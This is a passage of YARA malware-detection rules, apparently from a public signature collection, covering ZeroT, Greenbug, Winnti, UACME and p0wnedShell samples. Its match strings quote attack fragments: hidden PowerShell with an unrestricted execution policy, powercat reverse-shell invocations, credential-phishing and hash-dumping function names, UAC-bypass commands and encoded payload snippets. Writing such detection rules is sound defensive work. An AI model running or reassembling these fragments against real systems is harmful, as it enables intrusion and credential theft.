\"5466d47363e11cd1852807b57d26a828728b9d5a0389214181b966bd0d8d7e56\"\n      tags = \"DEMO, EXPLOIT, FILE, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ysoserialq\" fullword ascii\n      $s1 = \"targetClassInterceptorMetadatat\" fullword ascii\n      $s2 = \"targetInstancet\" fullword ascii\n      $s3 = \"targetClassL\" fullword ascii\n      $s4 = \"POST_ACTIVATEsr\" fullword ascii\n      $s5 = \"PRE_DESTROYsq\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xedac and filesize < 10KB and $x1 ) or ( all of them )\n}\n\nrule CN_APT_ZeroT_nflogger_RID2EEC : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Chinese APT by Proofpoint ZeroT RAT  - file nflogger.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-04 11:35:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"946adbeb017616d56193a6d43fe9c583be6ad1c7f6a22bab7df9db42e6e8ab10\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\LoaderDll.VS2010\\\\Release\\\\\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}\n\nrule CN_APT_ZeroT_extracted_Go_RID3071 : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Chinese APT by Proofpoint ZeroT RAT  - file Go.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-04 12:40:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"83ddc69fe0d3f3d2f46df7e72995d59511c1bfcca1a4e14c330cb71860b4806b\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\cmd.exe /c %s\\\\Zlh.exe\" fullword ascii\n      $x2 = \"\\\\BypassUAC.VS2010\\\\Release\\\\\" ascii\n      $s1 = \"Zjdsf.exe\" fullword ascii\n      $s2 = \"SS32prep.exe\" fullword ascii\n      $s3 = \"windowsgrep.exe\" fullword ascii\n      $s4 = \"Sysdug.exe\" fullword ascii\n      $s5 = \"Proessz.exe\" fullword ascii\n      $s6 = \"%s\\\\Zlh.exe\" fullword ascii\n      $s7 = \"/C %s\\\\%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( 7 of them )\n}\n\nrule CN_APT_ZeroT_extracted_Mcutil_RID3229 : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Chinese APT by Proofpoint ZeroT RAT  - file Mcutil.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-04 13:53:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"266c06b06abbed846ebabfc0e683f5d20dadab52241bc166b9d60e9b8493b500\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LoaderDll.dll\" fullword ascii\n      $s2 = \"QageBox1USER\" fullword ascii\n      $s3 = \"xhmowl\" fullword ascii\n      $s4 = \"?KEYKY\" fullword ascii\n      $s5 = \"HH:mm:_s\" fullword ascii\n      $s6 = \"=licni] has maX0t\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 3 of them ) or ( all of them )\n}\n\nrule PP_CN_APT_ZeroT_1_RID2CC8 : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:03:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"09061c603a32ac99b664f7434febfc8c1f9fd7b6469be289bb130a635a6c47c0\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"suprise.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule PP_CN_APT_ZeroT_2_RID2CC9 : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:04:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"74eb592ef7f5967b14794acdc916686e061a43169f06e5be4dca70811b9815df\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NO2-2016101902.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule PP_CN_APT_ZeroT_3_RID2CCA : APT CHINA DEMO FILE T1218_001 {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:04:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ee2e2937128dac91a11e9bf55babc1a8387eb16cebe676142c885b2fc18669b2\"\n      tags = \"APT, CHINA, DEMO, FILE, T1218_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/svchost.exe\" fullword ascii\n      $s2 = \"RasTls.dll\" fullword ascii\n      $s3 = \"20160620.htm\" fullword ascii\n      $s4 = \"* $l&$\" fullword ascii\n      $s5 = \"dfjhmh\" fullword ascii\n      $s6 = \"/20160620.htm\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5449 and filesize < 1000KB and 3 of them ) or ( all of them )\n}\n\nrule PP_CN_APT_ZeroT_4_RID2CCB : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:04:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a9519d2624a842d2c9060b64bb78ee1c400fea9e43d4436371a67cbf90e611b8\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mcutil.dll\" fullword ascii\n      $s2 = \"mcut.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}\n\nrule PP_CN_APT_ZeroT_5_RID2CCC : APT CHINA DEMO FILE T1218_001 {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:04:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"74dd52aeac83cc01c348528a9bcb20bbc34622b156f40654153e41817083ba1d\"\n      tags = \"APT, CHINA, DEMO, FILE, T1218_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"dbozcb\" fullword ascii\n      $s1 = \"nflogger.dll\" fullword ascii\n      $s2 = \"/svchost.exe\" fullword ascii\n      $s3 = \"1207.htm\" fullword ascii\n      $s4 = \"/1207.htm\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5449 and filesize < 1000KB and 1 of ( $x* ) and 1 of ( $s* ) ) or ( all of them )\n}\n\nrule PP_CN_APT_ZeroT_7_RID2CCE : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fc2d47d91ad8517a4a974c4570b346b41646fac333d219d2f1282c96b4571478\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"RasTls.dll\" fullword ascii\n      $s2 = \"RasTls.exe\" fullword ascii\n      $s4 = \"LOADER ERROR\" fullword ascii\n      $s5 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}\n\nrule PP_CN_APT_ZeroT_8_RID2CCF : APT CHINA DEMO FILE T1218_001 {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4ef91c17b1415609a2394d2c6c353318a2503900e400aab25ab96c9fe7dc92ff\"\n      tags = \"APT, CHINA, DEMO, FILE, T1218_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/svchost.exe\" fullword ascii\n      $s2 = \"RasTls.dll\" fullword ascii\n      $s3 = \"20160620.htm\" fullword ascii\n      $s4 = \"/20160620.htm\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5449 and filesize < 1000KB and 3 of them )\n}\n\nrule PP_CN_APT_ZeroT_9_RID2CD0 : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:05:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a685cf4dca6a58213e67d041bba637dca9cb3ea6bb9ad3eae3ba85229118bce0\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"nflogger.dll\" fullword ascii\n      $s7 = \"Zlh.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}\n\nrule UACME_Akagi_2_RID2B49 : DEMO EXE FILE HKTL T1546_012 {\n   meta:\n      description = \"Detects Windows User Account Control Bypass - from files Akagi32.exe, Akagi64.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/hfiref0x/UACME\"\n      date = \"2017-02-03 09:00:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"caf744d38820accb48a6e50216e547ed2bb3979604416dbcfcc991ce5e18f4ca\"\n      hash2 = \"609e9b15114e54ffc40c05a8980cc90f436a4a77c69f3e32fe391c0b130ff1c5\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1546_012\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: Akagi.exe [Method] [OptionalParamToExecute]\" fullword wide\n      $x2 = \"[UCM] Target file already exists, abort\" fullword wide\n      $s1 = \"MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\" fullword wide\n      $s2 = \"Akagi.exe\" fullword wide\n      $s3 = \"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}\" fullword wide\n      $s4 = \"/c wusa %ws /extract:%%windir%%\\\\system32\\\\sysprep\" fullword wide\n      $s5 = \"/c wusa %ws /extract:%%windir%%\\\\system32\\\\migwiz\" fullword wide\n      $s6 = \"loadFrom=\\\"%systemroot%\\\\system32\\\\sysprep\\\\cryptbase.DLL\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( 6 of them )\n}\n\nrule GoogleBot_UserAgent_RID2E80 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects the GoogleBot UserAgent String in an Executable\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-01-27 11:17:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\" fullword ascii\n      $fp1 = \"McAfee, Inc.\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and $x1 and not 1 of ( $fp* ) )\n}\n\nrule Greenbug_Malware_1_RID2DF8 : DEMO EXE FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Malware from Greenbug Incident\"\n      author = \"Florian Roth\"\n      reference = \"https://community.broadcom.com/home\"\n      date = \"2017-01-25 10:54:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"dab460a0b73e79299fbff2fa301420c1d97a36da7426acc0e903c70495db2b76\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"vailablez\" fullword ascii\n      $s2 = \"Sfouglr\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}\n\nrule Greenbug_Malware_2_RID2DF9 : DEMO EXE FILE MAL MIDDLE_EAST T1047 {\n   meta:\n      description = \"Detects Backdoor from Greenbug Incident\"\n      author = \"Florian Roth\"\n      reference = \"https://community.broadcom.com/home\"\n      date = \"2017-01-25 10:54:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"6b28a43eda5b6f828a65574e3f08a6d00e0acf84cbb94aac5cec5cd448a4649d\"\n      hash2 = \"21f5e60e9df6642dbbceca623ad59ad1778ea506b7932d75ea8db02230ce3685\"\n      hash3 = \"319a001d09ee9d754e8789116bbb21a3c624c999dae9cf83fde90a3fbe67ee6c\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"|||Command executed successfully\" fullword ascii\n      $x2 = \"\\\\Release\\\\Bot Fresh.pdb\" ascii\n      $x3 = \"C:\\\\ddd\\\\a1.txt\" fullword wide\n      $x4 = \"Bots\\\\Bot5\\\\x64\\\\Release\" ascii\n      $x5 = \"Bot5\\\\Release\\\\Ism.pdb\" ascii\n      $x6 = \"Bot\\\\Release\\\\Ism.pdb\" ascii\n      $x7 = \"\\\\Bot Fresh\\\\Release\\\\Bot\" ascii\n      $s1 = \"/Home/SaveFile?commandId=CmdResult=\" fullword wide\n      $s2 = \"raB3G:Sun:Sunday:Mon:Monday:Tue:Tuesday:Wed:Wednesday:Thu:Thursday:Fri:Friday:Sat:Saturday\" fullword ascii\n      $s3 = \"Set-Cookie:\\\\b*{.+?}\\\\n\" fullword wide\n      $s4 = \"SELECT * FROM AntiVirusProduct\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 2 of them ) ) or ( 3 of them )\n}\n\nrule Greenbug_Malware_3_RID2DFA : DEMO MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Backdoor from Greenbug Incident\"\n      author = \"Florian Roth\"\n      reference = \"https://community.broadcom.com/home\"\n      date = \"2017-01-25 10:54:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49\"\n      hash2 = \"7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c\"\n      tags = \"DEMO, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"F:\\\\Projects\\\\Bot\\\\Bot\\\\Release\\\\Ism.pdb\" fullword ascii\n      $x2 = \"C:\\\\ddd\\\\wer2.txt\" fullword wide\n      $x3 = \"\\\\Microsoft\\\\Windows\\\\tmp43hh11.txt\" wide\n   condition: \n      1 of them\n}\n\nrule Greenbug_Malware_4_RID2DFB : DEMO EXE FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects ISMDoor Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://community.broadcom.com/home\"\n      date = \"2017-01-25 10:55:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"308a646f57c8be78e6a63ffea551a84b0ae877b23f28a660920c9ba82d57748f\"\n      hash2 = \"82beaef407f15f3c5b2013cb25901c9fab27b086cadd35149794a25dce8abcb9\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"powershell.exe -nologo -windowstyle hidden -c \\\"Set-ExecutionPolicy -scope currentuser\" fullword ascii\n      $s2 = \"powershell.exe -c \\\"Set-ExecutionPolicy -scope currentuser -ExecutionPolicy unrestricted -f; . \\\"\" fullword ascii\n      $s3 = \"c:\\\\windows\\\\temp\\\\tmp8873\" fullword ascii\n      $s4 = \"taskkill /im winit.exe /f\" fullword ascii\n      $s5 = \"invoke-psuacme\" \n      $s6 = \"-method oobe -payload \\\"\\\"\" fullword ascii\n      $s7 = \"C:\\\\ProgramData\\\\stat2.dat\" fullword wide\n      $s8 = \"Invoke-bypassuac\" fullword ascii\n      $s9 = \"Start Keylog Done\" fullword wide\n      $s10 = \"Microsoft\\\\Windows\\\\WinIt.exe\" fullword ascii\n      $s11 = \"Microsoft\\\\Windows\\\\Tmp9932u1.bat\\\"\" fullword ascii\n      $s12 = \"Microsoft\\\\Windows\\\\tmp43hh11.txt\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them ) or ( 3 of them )\n}\n\nrule Winnti_fonfig_RID2C62 : CHINA DEMO EXE FILE G0044 MAL {\n   meta:\n      description = \"Winnti sample - file fonfig.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp?source=mmpc\"\n      date = \"2017-01-25 09:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"2c9882854a60c624ecf6b62b6c7cc7ed04cf4a29814aa5ed1f1a336854697641\"\n      tags = \"CHINA, DEMO, EXE, FILE, G0044, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mciqtz.exe\" fullword wide\n      $s2 = \"knat9y7m\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule Winnti_NlaifSvc_RID2CFF : CHINA DEMO EXE FILE G0044 MAL {\n   meta:\n      description = \"Winnti sample - file NlaifSvc.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp?source=mmpc\"\n      date = \"2017-01-25 10:13:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"964f9bfd52b5a93179b90d21705cd0c31461f54d51c56d558806fe0efff264e5\"\n      tags = \"CHINA, DEMO, EXE, FILE, G0044, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cracked by ximo\" ascii\n      $s1 = \"Yqrfpk\" fullword ascii\n      $s2 = \"IVVTOC\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 2 of them ) ) or ( 3 of them )\n}\n\nrule p0wnedPowerCat_RID2C84 : COBALTSTRIKE DEMO FILE HKTL {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPowerCat_RID2C84.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 09:52:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6a3ba991d3b5d127c4325bc194b3241dde5b3a5853b78b4df1bce7cbe87c0fdf\"\n      tags = \"COBALTSTRIKE, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Now if we point Firefox to http://127.0.0.1\" fullword ascii\n      $x2 = \"powercat -l -v -p\" fullword ascii\n      $x3 = \"P0wnedListener\" fullword ascii\n      $x4 = \"EncodedPayload.bat\" fullword ascii\n      $x5 = \"powercat -c \" fullword ascii\n      $x6 = \"Program.P0wnedPath()\" ascii\n      $x7 = \"Invoke-PowerShellTcpOneLine\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7375 and filesize < 150KB and 1 of them ) or ( 2 of them )\n}\n\nrule p0wnedExploits_RID2CB7 : COBALTSTRIKE DEMO HKTL T1033 {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedExploits_RID2CB7.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 10:01:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"54548e7848e742566f5596d8f02eca1fd2cbfeae88648b01efb7bab014b9301b\"\n      tags = \"COBALTSTRIKE, DEMO, HKTL, T1033\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Pshell.RunPSCommand(Whoami);\" fullword ascii\n      $x2 = \"If succeeded this exploit should popup a System CMD Shell\" fullword ascii\n   condition: \n      all of them\n}\n\nrule p0wnedListenerConsole_RID2F78 : COBALTSTRIKE DEMO HKTL T1055_002 {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedListenerConsole_RID2F78.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 11:58:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d2d84e65fad966a8556696fdaab5dc8110fc058c9e9caa7ea78aa00921ae3169\"\n      tags = \"COBALTSTRIKE, DEMO, HKTL, T1055_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke_ReflectivePEInjection\" fullword wide\n      $x5 = \"p0wnedShell> \" fullword wide\n      $x6 = \"Resources.Get_PassHashes\" fullword wide\n      $s7 = \"Invoke_CredentialsPhish\" fullword wide\n      $s8 = \"Invoke_Shellcode\" fullword wide\n      $s9 = \"Resources.Invoke_TokenManipulation\" fullword wide\n      $s10 = \"Resources.Port_Scan\" fullword wide\n      $s20 = \"Invoke_PowerUp\" fullword wide\n   condition: \n      1 of them\n}\n\nrule p0wnedBinaries_RID2C8C : COBALTSTRIKE DEMO HKTL {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedBinaries_RID2C8C.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 09:53:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fd7014625b58d00c6e54ad0e587c6dba5d50f8ca4b0f162d5af3357c2183c7a7\"\n      tags = \"COBALTSTRIKE, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9\" ascii\n      $x2 = \"wpoWAB+LCAAAAAAABADs/QeyK7uOBYhORUNIenL+E2vBA0ympH3erY4f8Tte3TpbUiY9YRbcGK91vVKtr+tV3v/B/yr/m1vD/+DvNOVb+V/f\" ascii\n      $x3 = \"mo0MAB+LCAAAAAAABADsXQl24zqu3YqXII6i9r+xJ4AACU4SZcuJnVenf/9OxbHEAcRwcQGu62NbHsrax/Iw+3/hP5b+VzuH/4WfVeDf8n98\" ascii\n      $x4 = \"LE4CAB+LCAAAAAAABADsfQmW2zqu6Fa8BM7D/jf2hRmkKNuVm/Tt9zunkipb4giCIGb2/prhFUt5hVe+/sNP4b+pVvwPn+OQp/LT9ge/+\" ascii\n      $x5 = \"XpMCAB+LCAAAAAAABADsfQeWIzmO6FV0hKAn73+xL3iAwVAqq2t35r/tl53VyhCDFoQ3Y7zW9Uq1vq5Xef/CT+X/59bwFz6nKU/lp+8P/\" ascii\n      $x6 = \"STwAAB+LCAAAAAAABADtWwmy6yoO3YqXgJjZ/8ZaRwNgx/HNfX/o7qqUkxgzCM0SmLR2jHBQzkc4En9xZbvHUuSLMnWv9ateK/70ilStR\" ascii\n      $x7 = \"namespace p0wnedShell\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule p0wnedAmsiBypass_RID2D5B : COBALTSTRIKE DEMO HKTL {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedAmsiBypass_RID2D5B.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 10:28:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"345e8e6f38b2914f4533c4c16421d372d61564a4275537e674a2ac3360b19284\"\n      tags = \"COBALTSTRIKE, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Program.P0wnedPath()\" fullword ascii\n      $x2 = \"namespace p0wnedShell\" fullword ascii\n      $x3 = \"H4sIAAAAAAAEAO1YfXRUx3WflXalFazQgiVb5nMVryzxIbGrt/rcFRZIa1CQYEFCQnxotUhP2pX3Q337HpYotCKrPdbmoQQnkOY0+BQCNKRpe\" ascii\n   condition: \n      1 of them\n}\n\nrule p0wnedShell_outputs_RID2EDA : COBALTSTRIKE DEMO HKTL {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - from files p0wnedShell.cs, p0wnedShell.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 11:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e1f35310192416cd79e60dba0521fc6eb107f3e65741c344832c46e9b4085e60\"\n      tags = \"COBALTSTRIKE, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] For this attack to succeed, you need to have Admin privileges.\" fullword ascii\n      $s2 = \"[+] This is not a valid hostname, please try again\" fullword ascii\n      $s3 = \"[+] First return the name of our current domain.\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule EquationGroup_modifyAudit_Implant_RID3476 : APT DEMO EXE FILE {\n   meta:\n      description = \"EquationGroup Malware - file modifyAudit_Implant.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/messagefinale/\"\n      date = \"2017-01-13 15:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"b7902809a15c4c3864a14f009768693c66f9e9234204b873d29a87f4c3009a50\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LSASS.EXE\" fullword 